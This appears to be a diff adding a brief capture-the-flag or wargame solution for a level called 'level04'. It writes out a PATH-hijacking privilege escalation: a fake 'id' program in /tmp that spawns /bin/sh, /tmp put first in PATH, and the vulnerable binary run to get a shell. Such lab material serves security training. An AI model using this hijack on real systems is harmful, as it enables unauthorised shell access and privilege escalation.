@@ -1,0 +1,15 @@
+# mkdir /tmp/roku6185
+# vim /tmp/roku6185/id.c
+--------------------
+#include <stdlib.h>
+
+int main() {
+	system("/bin/sh");
+	return 0;
+}
+--------------------
+
+# gcc /tmp/roku6185/id.c -o /tmp/roku6185/id
+# export PATH="/tmp/roku6185:$PATH"
+# ./level04
+sh-4.1$ 
